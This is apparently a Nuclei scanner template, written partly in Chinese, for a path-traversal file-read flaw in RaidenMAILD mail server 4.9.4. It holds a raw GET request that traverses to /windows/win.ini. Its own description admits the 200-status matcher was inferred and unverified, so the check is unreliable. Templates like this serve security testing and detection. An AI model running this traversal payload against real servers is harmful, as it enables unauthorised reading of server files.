info:
  name: RaidenMAILD邮件服务器v.4.9.4存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'GET /webeditor/../../../windows/win.ini HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: max-age=0

    Connection: close'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
